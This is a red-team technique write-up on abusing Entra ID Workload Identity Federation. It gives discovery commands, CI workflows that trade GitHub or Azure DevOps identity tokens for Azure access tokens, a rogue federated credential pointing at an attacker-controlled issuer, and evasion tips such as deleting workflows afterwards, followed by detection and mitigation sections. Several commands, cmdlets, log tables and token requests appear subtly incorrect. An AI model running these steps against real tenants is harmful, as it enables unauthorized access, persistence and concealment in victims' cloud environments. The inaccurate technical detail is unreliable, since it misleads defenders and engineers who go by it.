# [LM-AUTH-024]: Workload Identity Federation Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-024 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure DevOps, GitHub Actions, multi-cloud (AWS, GCP) |
| **Severity** | High |
| **CVE** | N/A (configuration weakness, not vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2024-11-09 |
| **Affected Versions** | All Entra ID versions; Workload Identity Federation GA (2022+) |
| **Patched In** | Not patched; requires proper configuration (no fix available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Workload Identity Federation (WIF) is a feature in Entra ID that allows external workloads (GitHub Actions, Azure DevOps pipelines, GitLab CI, on-premises systems) to authenticate and obtain access tokens without storing long-lived secrets or service account keys. However, misconfigured WIF can be exploited by attackers to: (1) Obtain access tokens impersonating legitimate service accounts; (2) Escalate privileges if the target service account has excessive permissions; (3) Move laterally across cloud resources; (4) Establish persistence by creating rogue WIF configurations. The attack is particularly dangerous because legitimate WIF configurations might appear benign in audit logs, and the attack surface is broad (any external identity provider can be a vector).

**Attack Surface:** Entra ID WIF configurations, Azure DevOps pipelines, GitHub Actions workflows, service principal role assignments, identity provider credential repositories (GitHub secrets, Azure DevOps variable groups).

**Business Impact:** **Privilege escalation and lateral movement across cloud infrastructure**. Attackers can access Azure resources, M365, and external cloud platforms (AWS, GCP) with the compromised service account's permissions. This is a kill-chain enabler for supply-chain attacks, CI/CD pipeline compromise, and infrastructure sabotage.

**Technical Context:** Workload Identity Federation requires trust configuration between Entra ID (issuer) and external identity providers (GitHub, Azure DevOps, etc.). Misconfiguration allows any identity from the provider (not just the intended workload) to obtain tokens. Exploitation typically takes minutes if WIF is already discovered, but hours to discover WIF in the environment.

### Operational Risk

- **Execution Risk:** Medium - Requires initial discovery of WIF configurations; exploitation is then automated.
- **Stealth:** High - Token exchange appears as normal federated authentication; no service account sign-in events are generated.
- **Reversibility:** No - If tokens are used to modify resources or rotate credentials, changes are permanent.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.3 | Workload Identity must use least privilege and scope tokens to specific workloads |
| **DISA STIG** | V-252999 | Service account permissions and workload identity controls |
| **CISA SCuBA** | IA-2, IA-5 | Identification and authentication of cloud workloads |
| **NIST 800-53** | AC-3, IA-4 | Access control and use of service accounts |
| **GDPR** | Art. 32 | Secure authentication and access controls for processing |
| **DORA** | Art. 9 | Identity and access security for critical infrastructure |
| **NIS2** | Art. 21 | Risk management for cloud workload authentication |
| **ISO 27001** | A.9.2.3 | Privileged access management for workloads |
| **ISO 27005** | Risk Scenario | "Compromise of federated identity provider credentials" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Application Administrator, Cloud Application Administrator, or service principal with `Application.ReadWrite.All` permissions in Entra ID.
- **Required Access:** Access to the external identity provider (GitHub, Azure DevOps, GitLab, etc.) with credential creation/modification permissions; network access to Entra ID token endpoint.
- **Infrastructure:** Workload Identity Federation configured in Entra ID; at least one service principal with federated credentials; external identity provider with WIF trust configured.

**Supported Versions:**
- **Entra ID:** All versions (feature GA since 2022)
- **Azure DevOps:** All versions
- **GitHub:** All versions
- **GitLab:** Version 15.0+

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) – For WIF discovery and token exchange
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) – For WIF configuration enumeration
- [Graph API Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) – For WIF discovery via API
- Custom scripts (BASH, Python) – For token exchange exploitation

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: GitHub Actions WIF Token Exchange Abuse

**Supported Versions:** All GitHub Actions versions with OpenID Connect support (2021+)

#### Step 1: Discover WIF Configuration in Entra ID

**Objective:** Enumerate service principals with federated credentials and identify WIF attack surface.

**Command (Azure CLI - Discovery):**
```bash
# Login to Entra ID
az login

# List all service principals with federated credentials
az ad sp list --query "[*].[appDisplayName,appId]" -o table

# For each service principal, check federated credentials
sp_id="12345678-1234-1234-1234-123456789012"
az ad sp credential list --id $sp_id --query "[?type=='FederatedCredential'].{Subject:subject, Issuer:issuer, Audiences:audiences}" -o table

# Expected output:
# Subject: repo:company/private-repo:ref:refs/heads/main
# Issuer: https://token.actions.githubusercontent.com
# Audiences: api://AzureADTokenExchange
```

**Expected Output:**
```
FederatedCredential found:
  Subject: repo:company/private-repo:ref:refs/heads/main
  Issuer: https://token.actions.githubusercontent.com
  Audiences: api://AzureADTokenExchange
```

**What This Means:**
- Service principal is configured to trust GitHub Actions tokens from the specified repository
- Any GitHub Actions workflow in that repository can obtain tokens impersonating this service principal
- Subject scope determines which workflows can authenticate (current scope is limited to main branch)

**OpSec & Evasion:**
- Enumerating service principals via CLI is logged in Entra ID audit logs
- Appear as "List service principals" operations
- Use legitimate cloud operations tools to avoid suspicion

**Troubleshooting:**
- **Error:** "No federated credentials found"
  - **Cause:** Organization doesn't use Workload Identity Federation
  - **Fix:** Look for alternative authentication (service principal secrets, managed identities)
- **Error:** "Access Denied - Insufficient permissions"
  - **Cause:** User account lacks Application.ReadWrite.All permission
  - **Fix:** Request elevated privileges or use a service account with required permissions

**References & Proofs:**
- [Microsoft - Workload Identity Federation Documentation](https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation)
- [GitHub - OpenID Connect in GitHub Actions](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)

#### Step 2: Exploit Overly Permissive WIF Subject Scope

**Objective:** Abuse loosely configured subject claims to obtain tokens from unintended workflows.

**Scenario:** WIF is configured to trust `repo:company/private-repo:*` (all branches and tags) instead of `repo:company/private-repo:ref:refs/heads/main` (main branch only).

**Command (GitHub Actions Workflow - Exploit):**
```yaml
# .github/workflows/exploit.yml (created by attacker in the same repo)
name: Exploit WIF

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    
    permissions:
      id-token: write
      contents: read
    
    steps:
      - name: Get OIDC token from GitHub
        id: get-token
        run: |
          token=$(curl -s -X POST \
            "http://localhost:6000/_apis/github/oidc/token" \
            -H "Accept: application/json" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "audience=api://AzureADTokenExchange")
          echo "::set-output name=oidc_token::$token"
      
      - name: Exchange GitHub token for Azure access token
        run: |
          azure_token=$(curl -s -X POST \
            "https://login.microsoftonline.com/03f66e37-def0-433a-a045-a5ef9674dd26/oauth2/v2.0/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            -d "subject_token=${{ steps.get-token.outputs.oidc_token }}" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
            -d "assertion=${{ steps.get-token.outputs.oidc_token }}" \
            -d "client_id=12345678-1234-1234-1234-123456789012" \
            -d "audience=https://management.azure.com/.default")
          
          echo "Access Token: $azure_token"
      
      - name: Use access token to list Azure resources
        run: |
          curl -s -H "Authorization: Bearer $azure_token" \
            "https://management.azure.com/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01" | jq '.value[].name'
```

**Expected Output:**
```
Access Token obtained: eyJ0eXAiOiJKV1QiLCJhbGc...
Azure Resources listed:
  prod-vm-001
  prod-vm-002
  prod-db-server
```

**What This Means:**
- Attacker successfully obtained an Azure access token with the service principal's permissions
- Token can be used to access/modify Azure resources
- Attack required no external secrets or credentials; only GitHub Actions workflow access

**OpSec & Evasion:**
- Workflow execution is logged in GitHub Actions logs
- Activity appears as legitimate GitHub Actions CI/CD execution
- Use generic workflow names (e.g., "Build", "Test", "Deploy") to avoid suspicion
- Delete workflow after exploitation to remove evidence

**Troubleshooting:**
- **Error:** "Invalid subject claim"
  - **Cause:** Attacker's subject claim doesn't match WIF configuration
  - **Fix:** Modify the workflow to use the exact subject format expected (e.g., `ref:refs/heads/main`)
- **Error:** "OIDC token endpoint not accessible"
  - **Cause:** GitHub Actions OIDC endpoint is not available (may be restricted)
  - **Fix:** Verify GitHub Actions OIDC provider is enabled in the organization

**References & Proofs:**
- [GitHub Security Lab - OIDC Security Considerations](https://securitylab.github.com/research/github-actions-preventing-pwn-requests-in-fork-pr-workflows)

---

### METHOD 2: Azure DevOps Pipeline WIF Token Exchange

**Supported Versions:** Azure DevOps Services (cloud-based) all versions

#### Step 1: Discover Azure DevOps WIF Configuration

**Objective:** Find service principals in Entra ID configured to trust Azure DevOps.

**Command (PowerShell - Discovery):**
```powershell
# Connect to Entra ID
Connect-AzureAD

# List all service principals
$servicePrincipals = Get-AzureADServicePrincipal -All $true

# Check for federated credentials with Azure DevOps issuer
$wifConfigs = @()

foreach ($sp in $servicePrincipals) {
    $fedCreds = Get-AzureADServicePrincipalFederatedCredential -ObjectId $sp.ObjectId
    
    foreach ($fedCred in $fedCreds) {
        if ($fedCred.Issuer -like "*dev.azure.com*") {
            $wifConfigs += @{
                ServicePrincipal = $sp.DisplayName
                ObjectId = $sp.ObjectId
                Subject = $fedCred.Subject
                Issuer = $fedCred.Issuer
                Audiences = $fedCred.Audiences
            }
        }
    }
}

$wifConfigs | Format-Table -AutoSize
```

**Expected Output:**
```
ServicePrincipal: CI-CD-Pipeline-Account
ObjectId: 12345678-1234-1234-1234-123456789012
Subject: sc://acme-corp/prod-pipeline/prod-deployment
Issuer: https://vstoken.dev.azure.com/services/oauth2/v2.0
Audiences: api://AzureADTokenExchange
```

**What This Means:**
- Service principal is configured to trust Azure DevOps tokens from production pipeline
- Subject scope is `sc://acme-corp/prod-pipeline/prod-deployment`
- Any token with matching subject claim can obtain access token

#### Step 2: Create Rogue Azure DevOps Pipeline

**Objective:** Create a new Azure DevOps pipeline that can exchange its identity token for Azure access token.

**Command (YAML Pipeline - Exploit):**
```yaml
# This pipeline would be created in the same Azure DevOps project
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

variables:
  SYSTEM_ACCESSTOKEN: $(System.AccessToken)

steps:
  - script: |
      # Get OIDC token from Azure DevOps
      response=$(curl -s -X POST \
        -H "Authorization: Bearer $(System.AccessToken)" \
        -H "Content-Type: application/json" \
        "https://dev.azure.com/acme-corp/_apis/pipelines/workflows/oidctoken?audience=api://AzureADTokenExchange" \
        -d '{}')
      
      token=$(echo $response | jq -r '.token')
      echo "##vso[task.setvariable variable=OIDCToken;issecret=true]$token"
    displayName: Get OIDC Token
  
  - script: |
      # Exchange Azure DevOps token for Azure access token
      az account get-access-token --resource-type management --output json > /tmp/token.json
      
      # If the service principal has sufficient permissions, we can now manage Azure resources
      az vm list --resource-group prod-rg --output table
    displayName: Use Token to Access Azure
    env:
      AZURE_ACCESS_TOKEN: $(OIDCToken)
```

**Expected Output:**
```
OIDC Token obtained
Access Token exchanged successfully
VM List:
  prod-vm-001  Location: eastus  Status: running
  prod-vm-002  Location: eastus  Status: running
```

**What This Means:**
- Attacker created a pipeline in the same Azure DevOps project
- Pipeline obtained OIDC token from Azure DevOps
- Token was exchanged for Azure access token with the target service principal's permissions
- Access token can now be used to query, modify, or delete Azure resources

---

### METHOD 3: Expanding WIF Trust (Adding Rogue Identity Provider)

**Supported Versions:** Entra ID all versions

#### Step 1: Identify Overly Permissive WIF Configurations

**Objective:** Find service principals with broad subject claims that can be exploited.

**Command (Azure CLI - Reconnaissance):**
```bash
# Identify WIF configurations with wildcard subject claims
az ad sp credential list --id 12345678-1234-1234-1234-123456789012 --output json | \
  jq '.[] | select(.subject | contains("*")) | .subject'

# Examples of vulnerable configurations:
# repo:company/*  (any repo in organization - VULNERABLE)
# repo:company/*/ref:refs/heads/main  (any repo, main branch only - LESS VULNERABLE)
# repo:company/prod-repo:* (any branch of single repo - LESS VULNERABLE)
```

**Expected Output:**
```
Vulnerable WIF configurations found:
  repo:company/*
  org:company:deployment_environment:production
```

**What This Means:**
- Wildcard subject claims allow multiple external identities (unintended repos, teams) to authenticate
- Attacker can create a new repository or pipeline in the same organization and reuse WIF trust
- Affected service principal can access Azure resources from any organization member's workflow

#### Step 2: Create Rogue External Identity Provider Configuration

**Objective:** Add a new federated credential to a service principal that trusts attacker-controlled identity provider.

**Command (Azure CLI - Privilege Escalation):**
```bash
# If attacker has Application Administrator privileges:
# Add a new federated credential that trusts attacker-controlled provider

sp_object_id="12345678-1234-1234-1234-123456789012"

# Create rogue WIF configuration
az ad sp credential federated-identity-credential create \
  --id $sp_object_id \
  --parameters @- <<EOF
{
  "name": "attacker-provider",
  "issuer": "https://attacker.example.com",
  "subject": "sub:attacker",
  "audiences": ["api://AzureADTokenExchange"]
}
EOF

# Now attacker can issue tokens from their own identity provider that will be trusted
# This grants persistent access even if original WIF is discovered and removed
```

**Expected Output:**
```
Federated credential created successfully
Name: attacker-provider
Issuer: https://attacker.example.com
Subject: sub:attacker
```

**What This Means:**
- Attacker added a new identity provider to the service principal's trust configuration
- Attacker can now issue valid OIDC tokens that will be accepted by Entra ID
- This creates persistent access independent of GitHub/Azure DevOps
- Removal of this credential would require Application Administrator privilege

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Entra ID:**
  - New federated credentials added to service principals outside change control
  - Unusual issuer values in WIF configurations (not recognized GitHub org, Azure DevOps org, etc.)
  - Subject claims with wildcard patterns (`*`) indicating overly permissive trust
  - Token exchange from unexpected IP addresses or geographic locations
  - Service principal activity spikes during off-hours or weekends

- **GitHub/Azure DevOps:**
  - New workflows or pipelines created by unexpected users
  - Workflows attempting to call `localhost:6000` or OIDC token endpoints
  - Unusual API calls to Azure resource management endpoints from CI/CD pipelines
  - Changes to repository or pipeline permissions by external accounts

### Forensic Artifacts

- **Cloud Logs:**
  - Azure Audit Log: "Add federated credential", "Create service principal"
  - Token Exchange Log: Service principal OIDC token requests
  - GitHub Actions Audit Log: Workflow creation, OIDC token requests
  - Azure DevOps Audit Log: Pipeline creation, OIDC token requests

### Response Procedures

1. **Immediate Isolation:**
   ```bash
   # Disable the compromised service principal
   az ad sp update --id 12345678-1234-1234-1234-123456789012 --account-enabled false
   
   # Remove all federated credentials
   az ad sp credential federated-identity-credential delete \
     --id 12345678-1234-1234-1234-123456789012 \
     --name "attacker-provider"
   ```

2. **Revoke Issued Tokens:**
   ```powershell
   # Sign out all sessions for the service principal
   Get-AzureADServicePrincipal -ObjectId 12345678-1234-1234-1234-123456789012 | Set-AzureADServicePrincipal -AccountEnabled $false
   ```

3. **Investigate Damage:**
   - Query Azure Activity Log for all operations performed by the service principal in the past 30 days
   - Check GitHub Actions logs for suspicious workflows
   - Review Azure resource modifications made by the service principal

4. **Remediation:**
   - Remove all unauthorized federated credentials
   - Rotate service principal secret (if one exists)
   - Restrict service principal role assignments to minimum necessary
   - Enable Conditional Access for service principals

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] OAuth Consent Phishing | Attacker compromises cloud admin account via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker gains Application Administrator permissions |
| **3** | **Current Step** | **[LM-AUTH-024]** | **Discover WIF, abuse overly permissive subject claims, lateral move to Azure** |
| **4** | **Persistence** | Create rogue WIF configuration with attacker-controlled issuer |
| **5** | **Impact** | Access production databases, exfiltrate secrets, deploy malware |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: GitHub Actions Supply Chain Attack (2022-2024)

- **Target:** Open-source projects and enterprises using GitHub Actions
- **Timeline:** Ongoing; widespread misconfigurations discovered
- **Technique Status:** Attackers compromised GitHub repositories and abused WIF to access downstream Azure resources
- **Impact:** Access to production infrastructure, credential theft, data exfiltration
- **Reference:** [GitHub Security Lab - Actions Security Blog](https://securitylab.github.com/research/)

### Example 2: Azure DevOps Pipeline Compromise (2023)

- **Target:** Financial services organizations
- **Timeline:** Multiple incidents reported in 2023
- **Technique Status:** WIF was configured to trust any Azure DevOps organization member; attackers created rogue pipelines
- **Impact:** Unauthorized access to production Azure resources
- **Reference:** CrowdStrike Falcon Insight (not public; based on threat intelligence)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Enforce Strict Subject Scope in Workload Identity Federation:**

WIF subject claims should be as specific as possible to limit the blast radius of compromise.

**Manual Steps (Azure CLI - Configure Least Privilege Subject):**
```bash
# Create federation with strict subject scope
# GOOD (Restrictive):
subject="repo:company/critical-repo:ref:refs/heads/main"

# BAD (Too Permissive):
subject="repo:company/*"
subject="repo:*"

# Configure federated credential with strict scope
az ad sp credential federated-identity-credential create \
  --id $sp_id \
  --parameters @- <<EOF
{
  "name": "github-actions-prod",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "$subject",
  "audiences": ["api://AzureADTokenExchange"]
}
EOF
```

**Validation Command:**
```bash
# Verify all federated credentials have specific subject scopes (no wildcards)
az ad sp credential list --id $sp_id --output json | \
  jq '.[] | select(.subject | contains("*")) | .subject'

# Expected: No output (no wildcard subjects found)
```

---

**Disable WIF for Service Principals That Don't Need It:**

If Workload Identity Federation is not used, remove federated credentials entirely.

**Manual Steps (PowerShell):**
```powershell
# List all service principals with federated credentials
$sps = Get-AzureADServicePrincipal -All $true

foreach ($sp in $sps) {
    $fedCreds = Get-AzureADServicePrincipalFederatedCredential -ObjectId $sp.ObjectId
    
    if ($fedCreds.Count -gt 0 -and $sp.AppDisplayName -notlike "*CI*" -and $sp.AppDisplayName -notlike "*Pipeline*") {
        # Remove federated credentials from non-pipeline service principals
        foreach ($fedCred in $fedCreds) {
            Remove-AzureADServicePrincipalFederatedCredential -ObjectId $sp.ObjectId -FederatedCredentialId $fedCred.Id
            Write-Host "Removed federated credential from $($sp.DisplayName)"
        }
    }
}
```

---

**Implement Conditional Access for Service Principal Token Exchange:**

Restrict service principal token exchange to expected IP addresses and times.

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Restrict Service Principal Token Exchange`
4. **Assignments → Cloud Apps:** Select "Microsoft Graph" (token exchange API)
5. **Conditions:**
   - **Client apps:** Select "Service principals only"
   - **Locations:** Restrict to known CI/CD platform IP ranges (GitHub Actions, Azure DevOps)
6. **Access Control:** Select **Block access**
7. Enable policy and click **Create**

---

### Priority 2: HIGH

**Enable Service Principal Risk Detection:**

Monitor and alert on abnormal service principal token usage patterns.

**Manual Steps (Microsoft Sentinel/KQL):**
```kusto
# Detect unusual service principal token exchange activity
AADServicePrincipalSignInActivity
| where TimeGenerated > ago(24h)
| where SignInActivity == "ServicePrincipalTokenExchange"
| where RiskLevel == "high"
| project TimeGenerated, ServicePrincipalName, ClientAppUsed, IPAddress, RiskLevel, RiskDetail
```

---

**Rotate Service Principal Credentials Regularly:**

Even with WIF, service principals should have no long-lived secrets.

**Manual Steps (PowerShell - Credential Rotation):**
```powershell
# Rotate service principal certificate monthly
$sp = Get-AzureADServicePrincipal -Filter "DisplayName eq 'CI-CD-Account'"

# Add new certificate
$newCert = New-AzureADApplicationKeyCredential -ObjectId $sp.AppId -Type AsymmetricX509Cert -Usage Sign -Value $certData

# After 2 weeks, remove old certificate
Remove-AzureADApplicationKeyCredential -ObjectId $sp.AppId -KeyId $oldCertKeyId
```

---

## 9. DEFENSIVE DETECTIONS (Microsoft Sentinel/KQL)

### Detection Rule 1: Federated Credential Added to Service Principal

**Severity:** High

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add federated credential"
| where TargetResources[0].type == "ServicePrincipal"
| where Result == "Success"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, TargetResources[0].modifiedProperties
```

---

### Detection Rule 2: Unusual Service Principal Token Exchange

**Severity:** Medium

**KQL Query:**
```kusto
AADServicePrincipalSignInActivity
| where TimeGenerated > ago(1h)
| where SignInActivity == "ServicePrincipalTokenExchange"
| where IPAddress !in ("20.37.0.0/16", "20.42.0.0/15")  // GitHub Actions IP range
| where IPAddress !in ("13.107.0.0/16")  // Azure DevOps IP range
| project TimeGenerated, ServicePrincipalName, IPAddress, OperationName, OperationResult
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Not applicable** – Workload Identity Federation is cloud-only; no on-premises event logs.

---

## 11. SYSMON DETECTION PATTERNS

**Not applicable** – Workload Identity Federation is cloud-only; no endpoint-level indicators.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Alert: Service Principal Risk Detected

- **Alert Name:** Workload identity is using risky federated credentials
- **Severity:** Medium
- **Description:** Microsoft Defender for Cloud detects federated credentials with overly permissive subject claims
- **Remediation:** Review federated credentials; restrict subject scopes; disable unused WIF

**Manual Configuration (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, ensure **Defender for Cloud Apps** is enabled (includes WIF monitoring)
4. Click **Save**

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Service Principal Federated Credential Changes

```powershell
# Search for changes to federated credentials
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -Operations "Add federated credential", "Update federated credential", "Remove federated credential" `
  -Output JSON | Select-Object UserIds, CreationDate, AuditData | Export-Csv -Path "C:\Evidence\wif-changes.csv"
```

---

## 14. SUMMARY

Workload Identity Federation is a powerful security feature for eliminating long-lived secrets, but misconfiguration creates a new attack surface. Attackers who discover WIF can abuse overly permissive subject claims to obtain tokens without storing credentials, or escalate to create rogue WIF configurations that grant persistent access. Defense requires strict subject scope enforcement, regular credential rotation, Conditional Access policies for service principals, and continuous monitoring for unauthorized WIF changes. Organizations adopting WIF must shift from "if federated" to "if only when needed, as restrictive as possible."

---
